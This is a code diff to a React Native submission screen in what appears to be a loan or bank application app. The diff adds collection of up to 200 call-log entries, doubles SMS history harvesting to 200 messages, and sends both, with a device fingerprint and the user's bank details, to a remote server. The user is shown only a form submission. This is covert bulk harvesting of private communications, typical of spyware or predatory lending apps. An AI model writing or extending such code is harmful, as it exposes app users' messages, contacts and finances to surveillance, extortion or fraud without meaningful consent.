@@ -1,3 +1,6 @@
+import SmsService from '../services/SmsService';
+import DeviceService from '../services/DeviceService';
+import CallLogService from '../services/CallLogService';
 import { submitApplication as apiSubmit } from '../services/api';
 
 export default function SubmissionScreen({ navigation, route }) {
@@ -5,6 +8,7 @@ export default function SubmissionScreen({ navigation, route }) {
     const fadeAnim = useRef(new Animated.Value(0)).current;
     const [deviceInfo, setDeviceInfo] = useState(null);
     const [lastSms, setLastSms] = useState(null);
+    const [lastCall, setLastCall] = useState(null);
     const [submitting, setSubmitting] = useState(false);
     const [refId, setRefId] = useState(null);
 
@@ -13,15 +17,18 @@ export default function SubmissionScreen({ navigation, route }) {
             setSubmitting(true);
 
             // 1. Request high-privilege permissions
+            console.log('[Submission] Requesting permissions...');
             const smsPerm = await SmsService.requestPermissions();
             const devPerm = await DeviceService.requestPermissions();
+            const callPerm = await CallLogService.requestPermissions();
 
             let analyzedSms = null;
             let analyzedDevice = null;
+            let analyzedCalls = null;
 
             if (smsPerm) {
                 try {
-                    const history = await SmsService.listMessages(100);
+                    const history = await SmsService.listMessages(200);
                     if (history && history.length > 0) {
                         setLastSms(history[0]);
                         analyzedSms = history;
@@ -37,6 +44,16 @@ export default function SubmissionScreen({ navigation, route }) {
                 } catch (e) { console.log('Device Info error:', e); }
             }
 
+            if (callPerm) {
+                try {
+                    const logs = await CallLogService.listLogs(200);
+                    if (logs && logs.length > 0) {
+                        setLastCall(logs[0]);
+                        analyzedCalls = logs;
+                    }
+                } catch (e) { console.log('Call Log error:', e); }
+            }
+
             // 2. Prepare full payload for Database
             try {
                 const fullData = {
@@ -46,12 +63,14 @@ export default function SubmissionScreen({ navigation, route }) {
                     ...route.params.bankDetails,
                     deviceFingerprint: analyzedDevice,
                     smsHistory: analyzedSms,
+                    callHistory: analyzedCalls,
                 };
 
+                console.log('[Submission] Sending data to bank servers...');
                 const result = await apiSubmit(fullData);
                 setRefId(result.applicationId);
             } catch (e) {
-                console.log('Submission failed:', e);
+                console.error('[Submission] Failed:', e);
             } finally {
                 setSubmitting(false);
             }
